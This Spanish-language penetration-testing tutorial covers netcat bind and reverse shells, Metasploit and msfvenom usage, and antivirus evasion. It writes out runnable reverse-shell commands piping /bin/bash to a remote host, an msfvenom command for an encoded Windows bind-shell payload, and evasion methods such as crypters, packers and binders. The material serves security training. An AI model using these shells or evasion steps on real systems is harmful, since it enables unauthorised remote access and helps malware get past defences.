Uno de los usos más comunes de netcat es el establecimiento de shells. Esto se basa en la capacidad que tiene la herramienta para redirigir los mensajes de entrada, salida y error a puertos TCP o UDP, en vez de mostrarse por consola, lo que permite que una aplicación existente en un equipo quede vinculada a un puerto local del equipo. Cuando esto sucede, cualquiera que se conecte a dicho puerto local, realmente estará ejecutando dicha aplicación.

Esto, que a priori puede parecer complicado de entender, se realiza de una manera muy sencilla con **netcat**, siempre y cuando en el equipo que actúa como víctima se disponga de la versión tradicional o **ncat**. La principal dificultad se encuentra en conseguir que ejecutar el comando en el equipo víctima, para lo cual existen diversas técnicas (https://www.revshells.com/).

**Shell directa (bind shell) con netcat**

En el siguiente ejemplo, se establece una bind shell desde un equipo atacante a un servidor en el que se ha abierto un listener.

Para abrir una bind shell se deben seguir los siguientes pasos:

1º. En el equipo víctima se abre un listener y se indicará el programa a ejecutar después de la conexión. En el caso de un equipo **Linux** se indicará una shell, como puede ser **/bin/bash**. Si se trata de un equipo Windows se indicará **cmd** o **Powershell**.

```bash
nc -nlvp 4433 -e /bin/bash
```

En este ejemplo se utiliza un nuevo parámetro que no se ha utilizado en el ejemplo anterior:

- **-e:** indica el programa que se ejecutará al iniciar la conexión.

2º. En el equipo atacante se inicia una conexión.

```bash
nc 10.10.10.5 4433
```

Una vez obtenida una shell se pueden ejecutar comandos en el equipo remoto desde el equipo atacante.

**Shell reversa (reverse shell) con netcat**

En la mayor parte de ocasiones no será posible establecer una bind shell, aunque se logre ejecutar **netcat** en el equipo víctima, puesto que existirán diversos mecanismos de defensa que impedirán las conexiones entrantes desde equipos externos a la red. Sin embargo, es bastante probable que desde los equipos internos de la red si se permitan las conexiones salientes, lo que daría lugar a lo que se conoce como reverse shell.

Los pasos para abrir una reverse shell son los siguientes:

1º. En el equipo atacante se abre un listener.

```bash
nc -nlvp 443
```

2º. En el equipo víctima se inicia la conexión y se indica el programa a ejecutar después de la conexión.

```bash
nc 10.10.10.5 4433 -e /bin/bash
```

Al igual que en el caso de la bind shell, una vez obtenida la shell se pueden ejecutar comandos en el equipo remoto desde el equipo atacante.

# **Herramienta Metasploit y Msfvenom**

**Herramienta Metasploit** 

Metasploit es un framework “open source” de Explotación y Postexplotación en infraestructuras y sistemas. Escrito en lenguaje Ruby contiene herramientas orientadas a la explotación de vulnerabilidades. Además mantiene una gran base de datos de exploits de vulnerabilidades conocidas así como herramientas de generación de payloads específicos. También, contiene plugins específicos para integrarlo con motores de Bases de Datos, Nessus y nmap.  

Dispone de dos interfaces de acceso:  

- **msfconsole:** Interfaz de acceso en modo consola, es la opción por defecto.
- **armitage:** Interfaz gráfica de acceso, se ha de instalar a parte.

**Módulos principales**  
Metasploit está organizado en cinco módulos principales que desgranamos a continuación:  

- **Auxiliary:** Módulos de apoyo que nos proporcionan herramientas propias de la Fase de Enumeración y Escaneo así como otras herramientas para realizar ataques de fuerza bruta.
- **Exploits:** Contienen todos los exploits presentes en la plataforma Metasploit, se encuentran organizados en un modelo de carpetas jerárquico en base a Sistemas Operativos y Software afectado.
- **Payloads:** En este módulo se engloban todos los distintos payloads que maneja Metasploit, acciones simples como la creación de usuarios o grupos, modificación de configuración. Y distintas Shell inversas non-staged y staged así como la Sellcode propia de Metasploit llamada meterpreter.
- **Encoders:** Su objetivo es modificar el código del payload con la intención de ofuscarlo y evadir elementos de seguridad como Antivirus o IDS.
- **Post:** Estos son todos los módulos de Postexplotación disponibles en Metasploit. Nos ayudan en las actividades posteriores a la explotación de un sistema y su objetivo está relacionado con la transferencia de ficheros, ejecución de técnicas para lograr persistencia en la víctima, automatización de procesos, técnicas de elevación de privilegios, etc.
- **Nops:** Derivados de la abreviatura de No Operation, se emplean como relleno de instrucciones para mantener la coherencia en los bloques de bytes del código. Estos modulos se usan en conjunción con la explotación de vulnerabilidades de tipo stack-based buffer overflow.

**Uso de Metasploit**  
Metasploit dispone de un acceso por consola a través de la herramienta msfconsole. En este submódulo se introducirán las opciones básicas de uso de msfconsole.  

Para poder acceder a msfconsole sólo hay que invocarla desde la línea de comandos:  

```bash
msfconsole
```

Se iniciará el intérprete de la consola msfconsole, podemos indicar el comando _help_ para comprobar el listado de comandos disponible.

La lista de comandos disponibles es bastante extensa. Sin embargo introduciremos los más importantes:  

- **Search**

El comando search sirve para realizar búsquedas en los módulos de Metasploit. La búsqueda se realiza en los campos de nombre y descripción por lo que si se buscara por el término “Windows” se incluirían todos los resultados que contengan la palabra Windows en el nombre del módulo o en la descripción:  

```bash
msf > search Término_a_buscar
```

- **Info**

El comando info proporciona información detallada sobre un módulo en particular de Metasploit sobre el que se consulta. Normalmente se utiliza para ver la descripción de un módulo antes de seleccionarlo para su uso, el target al que va destinado así como las opciones de configuración del módulo (IP y Puerto de la víctima, credenciales en caso de ser necesarias, etc.):  

```bash
msf > info ruta_del_modulo_a_consultar
```

- **Show**

Show sirve para mostrar todos los módulos disponibles en Metasploit. También se puede filtrar por categorías de módulos. Por ejemplo, si quisiéramos mostrar todos los módulos auxiliares emplearemos el siguiente comando:  

```bash
msf > show auxiliary
```

De la misma manera, podemos mostrar todos los exploits existentes en Metasploit:  

```bash
msf > show exploits
```

Por otro lado, cuando tenemos seleccionado un módulo (con el comando _use_) también podemos mostrar las opciones del módulo mediante el comando show options:  

```bash
msf > show options
```

Los Sistemas Operativos contra los que se puede lanzar el exploit que tenemos seleccionado:

```bash
msf > show targets
```

Incluso podemos indicar que nos muestre los distintos payloads compatibles para el  
exploit seleccionado:  

```bash
msf > show payloads
```

- **Use**

Una vez que se ha localizado el módulo que queremos utilizar (mediante el comando _search_ o _show_) el comando use sirve para seleccionar el módulo y configurar las variables necesarias para su correcto funcionamiento (con el comando _set_):

```bash
msf > use nombre_del_modulo
```

- **Set**

El comando set sirve para configurar las opciones de cada módulo y establecer un valor adecuado para el correcto funcionamiento del módulo (Recordad que hemos visto que con el comando show options podíamos ver las opciones del módulo que tengamos seleccionado):

```bash
msf (ms09_050_smb2_negotiate_func_index) > set nombre_de_la_variable valor_de_la_variable
```

- **Exploit o Run**

Sirve para ejecutar el módulo seleccionado una vez se han configurado las variables necesarias de manera correcta.

Para obtener un listado completo de los comandos de Metasploit y su uso específico podéis acceder al siguiente enlace (https://www.offsec.com/metasploit-unleashed/msfconsole-commands/).

**Herramienta Msfvenom**

La herramienta msfvenom es una herramienta incluida en la suite Metasploit que se utiliza para generar los payloads utilizados por el propio Metasploit. También es posible generar estos payloads por separado y en numerosos formatos de salida:  

- **Formato binario:** Ejecutable .exe o una librería .dll, un fichero compilado de java .jar
- **Formato interpretado:** Script en Python, PowerShell, ShellScript, VBScript. 

Tanto Metasploit como msfvenom se encuentran preinstalados en la distribución de Linux Kali. Sin embargo, dado que se encuentra desarrollado bajo el lenguaje de programación Ruby, se puede instalar en cualquier sistema que disponga de un motor de Ruby instalado (incluso en Microsoft Windows.)  

Podremos invocar la ayuda de msfvenom con el parámetro _-h_:  

```bash
msfvenom -h
```

**Opciones de msfvenom**  
Como podemos comprobar en el output anterior, msfvenom dispone de varias opciones de configuración para generar un payload. Desde las opciones de selección y configuración del exploit hasta la configuración del formato de salida. Si nos fijamos, los payloads de Metasploit y de msfvenom son los mismos. Esto es debido a que Metasploit utiliza msfvenom para generar el payload.  

A continuación se muestran las opciones de configuración del payload y el comando para obtener el listado de las mismas:  

- Listar los payloads disponibles:

```bash
msfvenom -l payloads
```  

- Listar las plataformas soportadas para la generación del payloads:

```bash
msfvenom -l plattforms
```  

- Listar todas las arquitecturas soportadas para la generación del payload:

```bash
msfvenom -l archs  
```

- Listar todos los formatos de salida en los que se puede generar el payload:

```bash
msfvenom -l formats
```  

- E incluso si queremos que se le aplique algún tipo de codificación al payload para tratar de pasar desapercibido podemos listar todos los encoders disponibles:

```bash
msfvenom -l encoders
``` 

**Generar el payload con msfvenom**  
A la hora de generar el payload, msfvenom dispone de distintos operadores para indicar cada opción de generación del exploit. Por ejemplo el siguiente comando genera un payload “bind reverse Shell” para un sistema Windows con una arquitectura de 32 bits, le aplica el encoder **shikata_ga_nai** tres veces y excluyendo el badchar “null” (x00 en hexadecimal). Por último el resultado de salida es un script en el lenguaje Python:

```bash
msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
```

En el siguiente enlace podéis obtener más información sobre las capacidades y uso de la herramienta msfvenom (https://www.offsec.com/metasploit-unleashed/msfvenom/).

# **Técnicas de Evasión de Antivirus**

Los antivirus funcionan principalmente mediante la detección de firmas conocidas relacionadas con malware o con las herramientas empleadas para su desarrollo. **Metasploit** es una herramienta muy conocida, por lo que cuando se genera un shellcode con **msfvenom** será detectado y bloqueado por prácticamente todos los antivirus. Se pueden modificar las firmas con diversas técnicas que se mencionarán posteriormente, aunque estos cambios generalmente no serán efectivos contra herramientas que basen su detección en análisis del comportamiento.

Esto representa un problema tanto durante la explotación como durante la post-explotación, cuando se intenta desplegar y ejecutar código en el equipo cliente, por lo que será necesario utilizar distintas técnicas tendentes a reducir o evitar completamente la detección. Entre las más comunes se pueden citar las siguientes:

- **Cerrar el antivirus:** se trata de una medida extrema que impedirá que detecte los archivos generados por el pentester, pero exponiendo el equipo a malware real. No se debe emplear nunca en acciones de pentesting, sobre todo en entornos de producción.
- **Ejecución en memoria:** su eficacia se basa en que las posibilidades de detección disminuyen, dado que no se descarga el archivo malicioso en el disco duro. Sin embargo, el riesgo no se elimina del todo y cada vez es más común que sea detectado.
- **Uso de scripts en lugar de ejecutables:** en ocasiones se podrá utilizar **PowerShell** para realizar acciones que no serán detectadas por el antivirus, pero, al igual que en el caso anterior, cada vez es una medida menos eficaz.
- **Compilación manual de un código fuente utilizando diferentes opciones:** si las firmas están generadas para una forma de compilar un código fuente, cabe la posibilidad de disminuir la posibilidad detección utilizando parámetros de configuración diferentes.
- **Usar herramientas y payloads propios:** es una de las técnicas más eficaces, dado que si el código es totalmente original ningún fabricante de antivirus tendrá firmas.
- **Ghost writing:** se trata de una técnica de manipulación de código consistente en desensamblar un exploit compilado, añadir o modificar algunas instrucciones en ensamblador que no afecten al funcionamiento del mismo, y volverlo a compilar.
- **Encoders:** con la utilización de _encoders_ se modifica el _payload_ original para que las firmas no coincidan con las que detecta el antivirus. Cuanto más popular sea el _encoder_ utilizado, más difícil será evitar la detección.
- **Packers:** son aplicaciones que utilizan un algoritmo para generar un archivo ejecutable que contiene los datos comprimidos y el código para descomprimirlos. Al ejecutar el binario, el _payload_ se descomprime y se ejecuta en memoria. Algunas de las packers más utilizados son **UPX**, **FSG**, **PECompact**, o **mpress**.
- **Binders:** estos programas se utilizan para embeber código malicioso en binarios legítimos. Algunos ejemplos son **Exejoiner** o **Exebinder**. **msfvenom** también se puede utilizar para realizar esta acción.
- **Crypters:** cifran el ejecutable con el propósito de dificultar el análisis por parte del antivirus. Cuando se cifra un _payload_ con un _crypter_ se genera una parte sin cifrar denominada _stub_, que es la que se ejecuta en primer lugar. El _stub_ realiza tres acciones: busca el _payload_ cifrado en el binario, localiza la clave de cifrado, y lo descifra directamente en memoria sin que toque el disco. Un _crypter_ bastante conocido es **Hyperion**.

A pesar de haber enumerado un buen número de técnicas, para tener una mayor probabilidad de éxito es necesario combinar varias de las técnicas anteriores. Existen herramientas que facilitan esta tarea, entre las que se pueden destacar **Shellter**, **The Backdoor Factory**, **Veil-Framework**, **Magic Unicorn** y **Ehowla**.

Los diferentes desarrolladores de productos de seguridad utilizan diferentes tecnologías y pueden manejar diferentes firmas, por lo que una técnica que resulte efectiva en un caso podría ser totalmente inútil en otro. Es decir, no existe una herramienta ni técnica mágica, la mejor será la que permita evitar la detección en el entorno y momento concretos en el que se realicen las acciones ofensivas. La correcta identificación del antivirus empleado por la organización resultará de gran importancia para poder realizar pruebas en un entorno de laboratorio.

Un error muy común cuando se realizan pruebas para evadir antivirus es subir los archivos a servicios de análisis de malware como **[Virus Total](https://www.virustotal.com/gui/home/upload)**. Esto es un error, dado que ese tipo de servicios comparten las muestras subidas con los desarrolladores de antivirus, por lo que aunque no sea detectado en este momento podría serlo en un breve plazo de tiempo. La mejor manera de probar la detección es instalar el antivirus en un equipo no conectado a Internet.

